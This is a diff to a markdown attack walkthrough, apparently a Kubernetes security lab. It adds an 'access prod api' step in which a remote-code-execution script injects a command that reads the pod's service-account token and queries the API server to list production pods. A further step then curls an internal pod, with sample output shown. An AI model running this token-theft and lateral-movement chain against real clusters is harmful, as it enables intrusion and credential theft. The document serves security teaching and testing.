@@ -7,6 +7,7 @@
     - [Container Secret](#container-secret)
     - [SA token](#sa-token)
     - [Cluster Secret](#cluster-secret)
+    - [access prod api](#access-prod-api)
   - [Attack Chain Summary](#attack-chain-summary)
 
 ---
@@ -132,6 +133,30 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
 
 echo "Y0x1U1Rlci1TZWNSZVQ=" | base64 -d; echo
 # cLuSTer-SecReT
+```
+
+---
+
+### access prod api
+
+```sh
+python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/prod/pods"
+      # "metadata": {
+      #   "name": "backend-api",
+      #   "namespace": "prod",
+      # "spec": {
+      #   "containers": [
+      #     {
+      #       "name": "nginx",
+      #       "image": "nginx:latest",
+      #      "ports": [
+      #        {
+      #          "containerPort": 80,
+      #          "protocol": "TCP"
+      #  "podIP": "10.244.1.17",
+
+python scripts/rce.py http://localhost:8080 "curl -sS http://10.244.1.17"
+
 ```
 
 ---
